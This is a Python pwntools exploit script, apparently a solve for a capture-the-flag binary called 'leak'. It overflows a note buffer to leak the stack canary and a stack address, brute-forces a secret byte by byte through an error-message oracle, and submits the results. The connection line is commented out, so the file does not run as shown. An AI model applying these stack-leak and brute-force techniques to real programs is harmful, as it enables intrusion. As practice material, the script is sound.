#!/usr/bin/env python

from pwn import *
import sys

# GLOBAL
bingo = ""

def check_secret(recvtext):
    ppp = "Somthing went wrong"
    yyy = "NoNoNo"
    if ppp in recvtext:
        return True
    elif yyy in recvtext:
        return False

#r = process("./leak")
#r = remote("127.0.0.1", 8888)

# r.recv()

### Canary & Stack 
r.sendlineafter(">", "2")
r.recv()
r.sendline("y")

# pause()
r.sendafter("Note:", "A" * 0x208 + "B")
r.recvuntil("AAAAB")
canary = u64("\x00" + r.recv(7))
stack = u64(r.recv(6) + "\x00\x00")
stack = stack - 0x70
print(stack)
log.success("Canary: " + hex(canary))
log.success("Stack: " + hex(stack))
r.sendlineafter("Continue?", "y")
r.sendlineafter("Take some note?", "y")
r.sendafter("Note:", "A" * 0x208 + "\x00")
r.sendlineafter("Continue?", "n")

### Secret (NEED TIME TO BRUTE FORCE)
for j in range(0,8):
    for i in range(0,256):
        r.sendlineafter(">", "1")
        payload = "A"*8 + bingo + chr(i)
        r.sendafter("Try:", payload)
        # sys.stdin.flush()
        index = r.recvuntil("#######################")
        # print(index) # debug-use
        # sys.stdout.flush()
        if check_secret(index):
            continue
        else:
            bingo += chr(i)
            break
bingo = u64(bingo)
log.success("Secret: " + hex(bingo))

sys.stdout.flush()

### CheckAnswer
r.sendline("5")
r.sendlineafter(">", "1")
r.sendafter("Stack:", p64(stack))
r.sendafter("Secret:", p64(bingo))
r.sendafter("Canary:", p64(canary))
r.interactive()
